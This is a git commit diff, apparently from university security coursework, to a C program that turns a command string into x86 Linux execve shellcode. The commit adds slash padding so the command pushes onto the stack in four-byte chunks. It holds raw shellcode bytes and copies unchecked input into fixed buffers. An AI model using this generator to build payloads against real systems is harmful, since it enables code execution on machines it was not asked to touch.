f8772e7c7e20bda78a08fea369d37dc5066e3b17
Alfred Gonsalves <agonsal2@asu.edu>
2017-04-29 09:47:11 -0700

    Command passed is properly converted to map to the stack

--- prog_shell.c
+++ prog_shell.c
@@ -2,7 +2,7 @@
 #include<string.h>
 #include<stdlib.h>
 
-char ascii[100];
+char ascii[100], new_ascii[100];
 char my_code[1024];
 char *shellcode1 = "\\x31\\xc0\\x50";
 char *shellcode2 = "\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80";
@@ -26,23 +26,30 @@ void charToHex(char c, char hex[3])
 
 void getHex(char *ascii, char output[1024])
 {
-	int i,c=0;
+	int i;
 	char hex[10];
-	if(strlen(ascii) % 4 != 0)
-		c = 4 - (strlen(ascii) % 4);
-	
 	strcpy(output, "");
 	for(i=0; i<strlen(ascii); i++) {
-		while(ascii[i] == '/' && c!=0) {
-			charToHex('/', hex);	
-			strcat(output, "\\x");
-			strcat(output, hex);	
-			c--;
-		}
 		charToHex(ascii[i], hex);
 		strcat(output, "\\x");
 		strcat(output, hex);		
 	}
+}
+
+void convert(char *ascii, char new_ascii[100])
+{
+    int i,c=0;
+    strcpy(new_ascii, "");
+   	if(strlen(ascii) % 4 != 0)
+		c = 4 - (strlen(ascii) % 4);
+	for(i=0; i<strlen(ascii); i++){
+	    while(ascii[i] == '/' && c!=0) {
+	        strcat(new_ascii, "/");
+	        c--;
+        }
+        new_ascii[strlen(new_ascii)] = ascii[i];
+    }
+
 }
 
 char* main(int argc, char * argv[])
@@ -55,17 +62,22 @@ char* main(int argc, char * argv[])
 		exit(1);
 	}
 	strcpy(ascii, argv[1]);
-	
+	convert(ascii, new_ascii);
+//	printf("Initial shellcode : %s\n",ascii);
+//	printf("New Shellcode : %s\n",new_ascii);
 	strcat(my_code, shellcode1);
-	for(i=strlen(ascii)-4; i>=0; i-=4) {
+	for(i=strlen(new_ascii)-4; i>=0; i-=4) {
 		for(j=0; j<4; j++) {
-			code[j] = ascii[i+j];
+			code[j] = new_ascii[i+j];
 		}
 		code[j]='\0';
 		strcat(my_code, "\\x68");
 		getHex(code, output);
 		strcat(my_code, output);
 	}
+//    printf("%s\n\n",my_code);
+//    getHex(new_ascii, output);
+//    strcat(my_code, output);
 	strcat(my_code, shellcode2);
 	printf("%s\n",my_code);		
 /*	int (*shell)();
